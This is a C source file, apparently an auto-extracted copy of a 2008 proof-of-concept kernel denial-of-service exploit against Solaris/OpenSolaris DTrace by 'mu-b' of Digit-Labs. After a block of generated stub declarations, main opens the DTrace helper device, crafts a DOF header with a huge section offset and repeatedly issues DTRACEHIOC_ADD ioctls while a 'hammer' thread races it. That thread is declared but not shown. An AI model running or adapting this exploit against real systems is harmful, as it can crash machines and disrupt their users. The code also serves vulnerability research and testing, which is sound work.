#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct dof_hdr {int dofh_secsize; int dofh_secnum; int dofh_secoff; int dofh_loadsz; void** dofh_ident; } ;

/* Variables and functions */
 void* DIF_DIR_NREGS ; 
 void* DIF_DTR_NREGS ; 
 void* DOF_ENCODE_NATIVE ; 
 size_t DOF_ID_DIFIREG ; 
 size_t DOF_ID_DIFTREG ; 
 size_t DOF_ID_DIFVERS ; 
 size_t DOF_ID_ENCODING ; 
 size_t DOF_ID_MODEL ; 
 size_t DOF_ID_VERSION ; 
 int /*<<< orphan*/  DOF_MAG_STRING ; 
 int /*<<< orphan*/  DOF_MAG_STRLEN ; 
 void* DOF_MODEL_LP64 ; 
 void* DOF_VERSION_2 ; 
 int /*<<< orphan*/  DTRACEHIOC_ADD ; 
 char* DTRACE_HELPER ; 
 int EXIT_FAILURE ; 
 int EXIT_SUCCESS ; 
 int /*<<< orphan*/  O_RDONLY ; 
 int /*<<< orphan*/  assert (int) ; 
 int changes ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  hammer ; 
 int ioctl (int,int /*<<< orphan*/ ,struct dof_hdr*) ; 
 int /*<<< orphan*/  memcpy (void***,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memset (struct dof_hdr*,int /*<<< orphan*/ ,int) ; 
 int open (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int pthread_create (int*,int /*<<< orphan*/ *,int /*<<< orphan*/ ,struct dof_hdr*) ; 
 int /*<<< orphan*/  stderr ; 

int
main (int argc, char **argv)
{
  union {
    struct dof_hdr hdr;
    unsigned char buf[256*1024];
  } hdr_t;
  struct dof_hdr *phdr;
  int i, fd, n, tid;

  printf ("Solaris >= 10/Opensolaris local kernel DoS PoC\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");

  fd = open (DTRACE_HELPER, O_RDONLY);
  if (fd < 0)
    {
      fprintf (stderr, "failed opening %s\n", DTRACE_HELPER);
      return (EXIT_FAILURE);
    }

  phdr = &hdr_t.hdr;
  memset (phdr, 0, sizeof *phdr);

  memcpy (&phdr->dofh_ident, DOF_MAG_STRING, DOF_MAG_STRLEN);
  phdr->dofh_ident[DOF_ID_MODEL] = DOF_MODEL_LP64;
  phdr->dofh_ident[DOF_ID_ENCODING] = DOF_ENCODE_NATIVE;
  phdr->dofh_ident[DOF_ID_VERSION] = DOF_VERSION_2;
  phdr->dofh_ident[DOF_ID_DIFVERS] = DOF_VERSION_2;
  phdr->dofh_ident[DOF_ID_DIFIREG] = DIF_DIR_NREGS;
  phdr->dofh_ident[DOF_ID_DIFTREG] = DIF_DTR_NREGS;
  phdr->dofh_secsize = 1024;
  phdr->dofh_secnum = 1024;
  phdr->dofh_secoff = 0x7fffffffffff0000;

  n = pthread_create (&tid, NULL, hammer, phdr);
  if (n < 0)
    {
      fprintf (stderr, "failed creating hammer thread\n");
      return (EXIT_FAILURE);
    }

  for (i = 0; ; i++)
    {
      phdr->dofh_loadsz = sizeof hdr_t / 2;
      n = ioctl (fd, DTRACEHIOC_ADD, phdr);
      assert (n == -1);

      if (!(i % 64))
        printf ("tried %d-times, %d-changes\r", i, changes);
    }

  /* not reached! */
  return (EXIT_SUCCESS);
}